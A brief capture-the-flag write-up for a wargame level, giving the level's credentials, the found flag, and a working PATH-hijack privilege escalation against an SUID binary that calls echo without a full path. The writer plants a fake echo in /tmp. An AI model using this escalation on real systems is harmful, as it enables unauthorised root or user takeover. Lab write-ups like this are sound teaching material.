username: level03  
password: kooda2puivaav1idi4f57q8iq
---

`level03` has SUID bit set, it can be executed as flag03

`level03` calls system("/usr/bin/env echo Exploit me"), `echo` is used without its full path.

```
$ ltrace ./level03
...
system("/usr/bin/env echo Exploit me"Exploit me
...
```

We could create a script to run any command and name it `echo`, then add its path to the environment variable `PATH` and it will be used instead of the real `echo`.

Executing the following commands outputs the flag

```
echo 'getflag' > /tmp/echo
chmod +x /tmp/echo
PATH=/tmp:$PATH ./level03
```

The flag is: qi0maab88jeaj46qoumi7maus
